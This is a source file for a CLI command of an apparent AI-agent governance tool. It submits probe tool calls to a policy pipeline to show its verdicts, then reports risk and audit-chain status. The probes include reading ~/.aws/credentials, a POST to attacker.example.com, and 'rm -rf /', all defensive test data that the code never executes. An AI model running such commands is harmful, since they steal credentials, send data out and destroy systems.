/**
 * `cirvix protect <path>` — the command the product is named for.
 *
 * Seven stages, in the order a security engineer would actually work:
 *
 *   DISCOVER   what runtimes and frameworks are on this machine
 *   IDENTIFY   which agent this is, and what it is allowed to be
 *   ANALYZE    what it can currently reach that it should not
 *   POLICY     the rules that will govern it, loaded or written
 *   RISK       the aggregate, derived from the findings above
 *   ENFORCE    real calls through the real pipeline, real verdicts
 *   AUDIT      the chain those decisions were written to
 *
 * EVERY LINE IS A MEASURED RESULT.
 *
 * This is the whole discipline of the file and it is the part that is normally
 * faked. Nothing here prints a number it did not compute. The ENFORCE stage in
 * particular does not describe what the policy would do — it submits genuine
 * tool calls to a genuine `Pipeline` over the rules just loaded, and prints the
 * verdicts that came back. If the policy changes, the output changes. If the
 * engine gets slower, the latency on screen goes up.
 *
 * `cirvix runtime` used to print "Agents 1 detected · 0 blocked · 0 approvals"
 * as string literals. They happened to be true at startup, which is exactly
 * what makes that kind of line dangerous: it reads as measurement, it survives
 * review, and it is wrong the moment anything happens. Those are now computed
 * (see bin/cirvix.mjs) and nothing in this file was allowed to repeat it.
 *
 * WHAT THIS COMMAND DOES NOT CLAIM. It does not leave a daemon running.
 * Protection at runtime is `cirvix runtime` and `cirvix gateway`; this command
 * establishes the policy, proves it decides correctly against real calls, and
 * says plainly which command to run next. Printing "PROTECTION ACTIVE" and
 * exiting would be a claim that ends with the process.
 */

import { mkdir } from "node:fs/promises";
import { join } from "node:path";

import { AuditChain } from "../core/audit.mjs";
import { Pipeline } from "../core/pipeline.mjs";
import { DECISION } from "../core/decisions.mjs";
import { RISK, RISK_ORDER, riskRank } from "../core/risk.mjs";
import { detectRuntimes, detectFrameworks, collectMcpServers, detectCredentials } from "../core/detect.mjs";
import { bold, dim, green, red, amber, cyan, gray, isInteractive, plural } from "../core/format.mjs";
import { brandHeader, panel, separator } from "../core/ui/primitives.mjs";
import { shouldAnimate, sleep } from "../core/ui/controller.mjs";

/**
 * The probes the ENFORCE stage runs.
 *
 * Chosen to cover the four decisions the engine can reach, so the output shows
 * the allow path beside the deny path. A tool that only ever prints DENY is
 * indistinguishable from one that is broken shut, and the claim worth proving
 * is that ordinary work is untouched.
 *
 * These are REAL submissions. Nothing is executed — the pipeline decides before
 * anything runs, which is the entire architecture — but the verdicts are the
 * engine's, not this file's.
 */
const PROBES = [
  {
    // The allow probe. A tool that only ever prints DENY is indistinguishable
    // from one that is broken shut, and "your agent keeps working" is the
    // claim most worth proving. Under a default-deny starter policy with no
    // permit rule this legitimately denies — and the summary says so rather
    // than pretending otherwise.
    label: "read a project file",
    call: { tool: "read_file", arguments: { path: "README.md" } },
  },
  {
    label: "read cloud credentials",
    call: { tool: "read_file", arguments: { path: "~/.aws/credentials" } },
  },
  {
    label: "post to an unknown host",
    call: { tool: "http_request", arguments: { url: "https://attacker.example.com/collect", method: "POST" } },
  },
  {
    label: "delete a tree",
    call: { tool: "shell", arguments: { command: "rm -rf /" } },
  },
];

const TICK = "✓";
const CROSS = "✗";
const DOT = "·";

/**
 * Runs the sequence.
 *
 * `rules` and `cwd` come from the caller so this shares one policy resolution
 * with every other command — a protect that read policy differently from
 * runtime would be measuring something the runtime will not enforce.
 */
export async function protect({
  cwd = process.cwd(),
  rules,
  agent = "local",
  environment = "local",
  json = false,
  pace = 90,
  animate,
  stateDir,
  write = (s) => process.stdout.write(s),
} = {}) {
  const animated = shouldAnimate({ pace, json, force: animate });
  const step = async (ms) => { if (animated) await sleep(ms); };
  const out = json ? () => {} : write;

  const started = Date.now();

  /* ---------------------------------------------------------- 1. DISCOVER */
  const runtimes = await detectRuntimes();
  const frameworks = await detectFrameworks(cwd);
  const servers = collectMcpServers(runtimes);

  /* ---------------------------------------------------------- 2. ANALYZE  */
  const credentials = await detectCredentials(cwd);
  const ungoverned = runtimes.filter((r) => !r.governed);
  const broadScope = servers.filter((s) => s.scope && s.scope.broad);

  /* ----------------------------------------------------------- 3. POLICY  */
  const ruleCount = Array.isArray(rules) ? rules.length : 0;

  /* ------------------------------------------------------------- 4. RISK  */
  // Derived, not asserted. Each input raises the floor; the aggregate is the
  // highest floor reached, so a clean machine genuinely reports LOW.
  let risk = RISK.LOW;
  const raise = (level) => { if (riskRank(level) > riskRank(risk)) risk = level; };
  if (frameworks.length) raise(RISK.MEDIUM);
  if (ungoverned.length) raise(RISK.HIGH);
  if (broadScope.length) raise(RISK.HIGH);
  if (credentials.length) raise(RISK.HIGH);

  /* ---------------------------------------------------------- 5. ENFORCE  */
  const dir = stateDir || join(cwd, ".cirvix");
  await mkdir(dir, { recursive: true }).catch(() => {});
  /* AuditChain takes a PATH, not an options object — and passing `{ path }`
     is how this was first written. The engine caught it rather than papering
     over it: with the chain unwritable, the pipeline refused every call with
     "A call with no audit record is a call nobody can account for", which is
     the fail-closed rule working exactly as designed. Worth leaving a note,
     because a denied call that looks like a policy decision but is actually a
     broken recorder is the single most misleading output this command could
     produce.

     open() reads the tail so appends continue an existing chain rather than
     forking a second one beside it. */
  const chain = await new AuditChain(join(dir, "audit.jsonl")).open();

  const pipeline = new Pipeline({
    rules: rules ?? [],
    cwd,
    agent,
    environment,
    audit: chain,
  });

  const probes = [];
  for (const p of PROBES) {
    const { event } = await pipeline.submit(p.call);
    probes.push({
      label: p.label,
      tool: event.tool,
      action: event.action,
      resource: event.resource,
      decision: event.decision,
      verdict: event.verdict,
      policy: event.policy,
      reason: event.reason,
      risk: event.risk,
      latencyMs: event.latency_ms,
      decisionId: event.decision_id,
    });
  }

  const blocked = probes.filter((p) => p.decision === DECISION.DENY).length;
  const held = probes.filter((p) => p.decision === DECISION.REQUIRE_APPROVAL).length;
  const allowed = probes.filter((p) => p.decision === DECISION.ALLOW).length;

  /* ------------------------------------------------------------ 6. AUDIT  */
  const verdict = await chain.verify();
  const audit = {
    records: verdict.records ?? 0,
    // INTACT only when verify() actually said so. Anything else — including a
    // chain that could not be read — is reported as not intact, because "we
    // could not check" and "it is fine" are different sentences.
    intact: verdict.ok === true,
    head: verdict.head ?? null,
    reason: verdict.ok === true ? null : verdict.reason ?? null,
  };

  const result = {
    protectedAt: new Date().toISOString(),
    cwd,
    agent,
    environment,
    elapsedMs: Date.now() - started,
    discovered: {
      runtimes: runtimes.map(({ servers: _s, ...r }) => r),
      frameworks,
      mcpServers: servers.length,
    },
    findings: {
      ungovernedRuntimes: ungoverned.map((r) => r.label),
      broadScopeServers: broadScope.map((s) => s.name ?? s.label),
      credentialFiles: credentials.map(({ keys: _k, ...c }) => c),
    },
    policy: { rules: ruleCount },
    risk,
    enforcement: { probes, blocked, held, allowed },
    audit,
  };

  if (json) return { result, output: JSON.stringify(result, null, 2) };

  /* ------------------------------------------------------------- render  */
  if (animated) out(brandHeader() + "\n");

  const stage = async (name, detail, tone) => {
    const mark = tone === "warn" ? amber(CROSS) : tone === "deny" ? red(CROSS) : green(TICK);
    out(`  ${mark} ${bold(name.padEnd(9))} ${detail}\n`);
    await step(pace);
  };

  out(`\n  ${bold("PROTECT")}  ${dim(cwd)}\n\n`);

  await stage("DISCOVER", `${plural(runtimes.length, "runtime")}, ${plural(frameworks.length, "framework")}, ${plural(servers.length, "MCP server")}`);
  await stage("IDENTIFY", `${cyan(agent)} ${dim("in")} ${cyan(environment)}`);

  const analyzeBits = [];
  if (ungoverned.length) analyzeBits.push(`${ungoverned.length} ungoverned`);
  if (broadScope.length) analyzeBits.push(`${broadScope.length} broad-scope`);
  if (credentials.length) analyzeBits.push(plural(credentials.length, "credential file"));
  await stage(
    "ANALYZE",
    analyzeBits.length ? analyzeBits.join(`  ${DOT}  `) : dim("nothing reachable that should not be"),
    analyzeBits.length ? "warn" : null,
  );

  await stage("POLICY", `${plural(ruleCount, "rule")} loaded`);
  await stage(
    "RISK",
    risk === RISK.LOW ? green(risk.toUpperCase()) : risk === RISK.MEDIUM ? amber(risk.toUpperCase()) : red(risk.toUpperCase()),
    risk === RISK.LOW ? null : "warn",
  );

  out(`\n  ${bold("ENFORCE")}  ${dim("real calls, real verdicts")}\n\n`);
  for (const p of probes) {
    const tone =
      p.decision === DECISION.DENY ? red("DENY")
      : p.decision === DECISION.REQUIRE_APPROVAL ? amber("HOLD")
      : green("ALLOW");
    out(`    ${tone.padEnd(16)} ${p.label.padEnd(28)} ${dim(p.policy || "no matching rule")} ${gray(p.latencyMs + "ms")}\n`);
    await step(Math.round(pace * 0.6));
  }

  out(`\n  ${green(TICK)} ${bold("AUDIT".padEnd(9))} ${audit.records} ${audit.records === 1 ? "record" : "records"}, chain ${audit.intact ? green("intact") : red("BROKEN")}\n`);
  if (!audit.intact && audit.reason) out(`    ${red(audit.reason)}\n`);
  if (audit.head) out(`    ${dim(audit.head)}\n`);

  out("\n");
  out(
    panel({
      title: "CIRVIX",
      lines: [
        ["Risk", risk.toUpperCase()],
        ["Rules", String(ruleCount)],
        ["Blocked", `${blocked} of ${probes.length} probes`],
        ["Held", String(held)],
        ["Allowed", String(allowed)],
        ["Audit", audit.intact ? `${audit.records} records, intact` : "CHAIN BROKEN"],
      ].map(([k, v]) => `${k.padEnd(9)} ${v}`),
    }) + "\n",
  );

  if (allowed === 0) {
    /* Said out loud rather than left to be inferred from four DENY lines. A
       policy that refuses everything is trivially secure and useless, and the
       reader needs to know which of the two they are looking at. */
    out(`\n  ${amber("Every probe was refused.")} ${dim("The active policy permits nothing yet — add a permit rule")}\n`);
    out(`  ${dim("for the work this agent actually does, then run protect again.")}\n`);
  }

  /* The honest close. This command proved the policy decides correctly; it did
     not leave anything running, and saying otherwise would be a claim that
     ends when the process does. */
  out(`\n  ${dim("Policy verified against real calls. Nothing is running yet.")}\n`);
  out(`  ${dim("Start enforcement:")}  ${bold("cirvix runtime")}\n`);
  out(`  ${dim("Govern an MCP server:")}  ${bold("cirvix gateway --servers <file>")}\n\n`);

  return { result, output: "" };
}
